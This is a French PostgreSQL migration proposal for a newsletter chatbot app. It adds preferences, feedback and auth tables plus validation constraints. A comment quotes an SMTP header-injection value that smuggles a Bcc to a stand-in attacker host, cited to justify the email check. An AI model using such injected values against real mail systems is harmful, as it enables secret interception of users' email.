-- PROPOSITION de la personne A - à valider avec B avant de la fusionner
-- dans db/schema/02-schema.sql (règle : aucune modif du schéma sans accord).
--
-- Ce fichier n'est PAS exécuté au démarrage (dossier proposals/).
-- Pour l'appliquer sur une base existante :
--   docker compose exec -T postgres sh -c \
--     'psql -U "$POSTGRES_USER" -d persona' < db/proposals/03-style-feedback-timezone.sql
--
-- Demandé par les workflows [A] Chat - Agent (outils ton/format,
-- feedback, sources exclues) et [A] Chat - Entrée ("mes données").

-- 1. Personnalisation du ton et du format (Phase 3)
--    À lire par B dans [B] News - Envoi pour adapter l'email.
ALTER TABLE preferences
    ADD COLUMN tone             TEXT   NOT NULL DEFAULT 'neutre'
        CHECK (tone IN ('neutre', 'decontracte', 'formel', 'humoristique')),
    ADD COLUMN format           TEXT   NOT NULL DEFAULT 'resume'
        CHECK (format IN ('titres', 'resume', 'detaille')),
    -- sources que l'utilisateur ne veut plus voir (ex. {'numerama'})
    ADD COLUMN excluded_sources TEXT[] NOT NULL DEFAULT '{}'
        CHECK (cardinality(excluded_sources) <= 10);

-- 2. Feedback sur les newsletters reçues (Phase 3)
--    Texte libre : à traiter comme une DONNÉE non fiable par B
--    (risque d'injection de prompt s'il est donné à un LLM).
CREATE TABLE feedback (
    id          BIGSERIAL PRIMARY KEY,
    user_id     UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    message     TEXT NOT NULL CHECK (length(message) BETWEEN 1 AND 1000),
    created_at  TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX idx_feedback_user ON feedback (user_id, created_at);

GRANT SELECT, INSERT, UPDATE, DELETE ON feedback TO persona_app;
GRANT USAGE, SELECT ON SEQUENCE feedback_id_seq TO persona_app;

-- 2 bis. Inscription et connexion guidées (A uniquement)
--    Le chat pose les questions une par une (email, consentement, mot de passe) :
--    on retient l'étape en cours par session de chat, 10 minutes maximum.
--    Aucun mot de passe n'est stocké ici.
CREATE TABLE auth_pending (
    chat_session_id  TEXT PRIMARY KEY,
    step             TEXT NOT NULL CHECK (step IN ('register_email', 'register_consent', 'register_password',
                                                   'login_email', 'login_password')),
    email            TEXT,
    created_at       TIMESTAMPTZ NOT NULL DEFAULT now()
);

GRANT SELECT, INSERT, UPDATE, DELETE ON auth_pending TO persona_app;

-- 3. Robustesse du workflow [B] News - Envoi
--    La requête horaire fait `now() AT TIME ZONE p.timezone` pour TOUS les
--    utilisateurs : un seul fuseau invalide en base fait échouer l'envoi
--    pour tout le monde. On refuse donc les fuseaux inconnus dès la base.
CREATE FUNCTION is_valid_timezone(tz TEXT) RETURNS BOOLEAN
LANGUAGE sql STABLE AS $$
    SELECT EXISTS (SELECT 1 FROM pg_timezone_names WHERE name = tz)
$$;

-- Une adresse contenant un saut de ligne est réinterprétée par l'envoi SMTP :
-- 'a@x.fr\r\nBcc: espion@evil.example' part vers espion@evil.example (test B07).
-- Le chatbot valide déjà le format ; la base le garantit pour tous les chemins d'écriture.
ALTER TABLE users
    ADD CONSTRAINT users_email_valid CHECK (
        length(email) <= 254
        AND email ~ '^[A-Za-z0-9._%+-]{1,64}@[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,}$');

ALTER TABLE preferences
    ADD CONSTRAINT preferences_timezone_valid CHECK (is_valid_timezone(timezone)),
    ADD CONSTRAINT preferences_send_days_valid
        CHECK (send_days <@ ARRAY[1,2,3,4,5,6,7]::smallint[] AND cardinality(send_days) >= 1);

-- 4. Rétention RGPD du feedback : 1 an
--   (recrée persona_cleanup() avec la ligne en plus ; le reste est inchangé)
CREATE OR REPLACE FUNCTION persona_cleanup() RETURNS void
LANGUAGE sql SECURITY DEFINER SET search_path = public, pg_temp AS $$
    DELETE FROM sessions         WHERE expires_at < now();
    DELETE FROM articles         WHERE fetched_at < now() - INTERVAL '30 days';
    DELETE FROM sent_newsletters WHERE sent_at    < now() - INTERVAL '6 months';
    DELETE FROM audit_log        WHERE created_at < now() - INTERVAL '1 year';
    DELETE FROM feedback         WHERE created_at < now() - INTERVAL '1 year';
    DELETE FROM auth_pending     WHERE created_at < now() - INTERVAL '1 hour';
$$;
